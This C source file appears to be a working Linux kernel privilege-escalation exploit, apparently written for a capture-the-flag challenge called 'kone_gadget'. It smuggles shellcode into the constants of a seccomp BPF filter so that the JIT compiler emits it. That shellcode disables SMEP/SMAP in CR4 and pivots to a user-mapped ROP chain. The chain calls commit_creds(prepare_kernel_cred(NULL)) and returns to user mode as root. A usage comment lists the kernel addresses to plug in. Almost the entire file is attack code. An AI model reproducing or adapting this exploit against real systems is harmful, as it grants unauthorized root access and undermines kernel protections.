#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include "common.h"

#define SECCOMP_MODE_FILTER	2


static void install_seccomp(u8 *filter, u16 length) {
    struct prog {
        u16 len;
        u8 *filter;
    } rule = {
        .len = length >> 3,
        .filter = filter
    };
    if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0)
        fatal("prctl(PR_SET_NO_NEW_PRIVS)");
    if(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &rule) < 0)
        fatal("prctl(PR_SET_SECCOMP)");
}


/*
HOW TO USE:
addr_commit_creds is just commit_creds
addr_prepare_kernel_cred is just prepare_kernel_cred
addr_trampoline is swapgs_restore_regs_and_return_to_usermode+0x16 (ret2user)
(Gadget starts with mov rdi, rsp)

To actually trigger the exploit, you need to jump to the jitted bpf.
In the kone_gadget challenge, this was 0xffffffffc0000f00
*/
void kone_gadget(u64 addr_commit_creds,
                 u64 addr_prepare_kernel_cred,
                 u64 addr_trampoline
                ) {
    save_state();

    int N = 0x312; // make bpf random entropy as small as possible
    u16 filter_length = N*8 + 8;
    u64 *filter = (u64*)malloc(filter_length);

    /* Map stack (POPULATE it so that it's readable/writable under KPTI) */
    char *stack = (char*)mmap((void*)0xfff000, 0x2000,
                              PROT_READ | PROT_WRITE,
                              MAP_ANONYMOUS | MAP_SHARED | MAP_POPULATE | MAP_FIXED,
                              -1, 0);
    if (stack != (char*)0xfff000)
        fatal("mmap");
    // Gadget-free ROP chain!
    u64 *rsp = (u64*)&stack[0x1000];
    *rsp++ = addr_prepare_kernel_cred;
    *rsp++ = addr_commit_creds;
    *rsp++ = addr_trampoline; // ret2usermode
    *rsp++ = 0xcafebabe; // garbage (pop rax)
    *rsp++ = 0xdeadbeef; // garbage (pop rdi)
    *rsp++ = (u64)&win;
    *rsp++ = user_cs;
    *rsp++ = user_rflags;
    *rsp++ = user_rsp;
    *rsp++ = user_ss;

    // Fill our filter with nop sled
    for (int i = 0; i < N; i++) {
        filter[i] = (u64)(0x01eb9090) << 32; // nop; nop; jmp 1;
    }
    u64 *chain = &filter[N - 20];
    // rdi = cr4
    *chain++ = (u64)(0x04E7200F) << 32; // mov rdi, cr4; add al, XX;
    // edx = ~0x300000
    *chain++ = (u64)(0x01ebD231) << 32; // xor edx, edx; jmp 1;
    *chain++ = (u64)(0x01ebC2FF) << 32; // inc edx; jmp 1;
    *chain++ = (u64)(0x01ebE2D1) << 32; // shl edx, 1; jmp 1;
    *chain++ = (u64)(0x01ebC2FF) << 32; // inc edx; jmp 1;
    *chain++ = (u64)(0x0414E2C1) << 32; // shl edx, 20; add al, XX;
    *chain++ = (u64)(0x01ebD2F7) << 32; // not edx;
    // rdi &= rdx
    *chain++ = (u64)(0x04D72148) << 32; // and rdi, rdx; add al, XX;
    // cr4 = rdi
    *chain++ = (u64)(0x04E7220F) << 32; // mov cr4, rdi; add al, XX;
    // esp = 0x1000000
    *chain++ = (u64)(0x01ebE431) << 32; // xor esp, esp; jmp 1;
    *chain++ = (u64)(0x01ebC4FF) << 32; // inc esp; jmp 1;
    *chain++ = (u64)(0x0418E4C1) << 32; // shl esp, 24; add al, XX;
    // commit_creds(prepare_kernel_cred(NULL));
    *chain++ = (u64)(0x01ebFF31) << 32; // xor edi, edi; jmp 1;
    *chain++ = (u64)(0x01eb9058) << 32; // pop rax; nop; jmp 1;
    *chain++ = (u64)(0x01ebD0FF) << 32; // call rax; jmp 1;
    *chain++ = (u64)(0x04C78948) << 32; // mov rdi, rax; add al, XX;
    *chain++ = (u64)(0x01eb9058) << 32; // pop rax; nop; jmp 1;
    *chain++ = (u64)(0x01ebD0FF) << 32; // call rax; jmp 1;
    // jump to swapgs_restore_regs_and_return_to_usermode
    *chain++ = (u64)(0xccE0FF58) << 32; // pop rax; jmp rax;
    filter[N] = 0x7fff000000000006; // RETURN ALLOW

    /* JIT our filter */
    install_seccomp((unsigned char*)filter, filter_length);

    /* Jump to nop sled of JIT-ted seccomp filter */
    puts("[+] bring your own shellcode: go brrrrr");
}
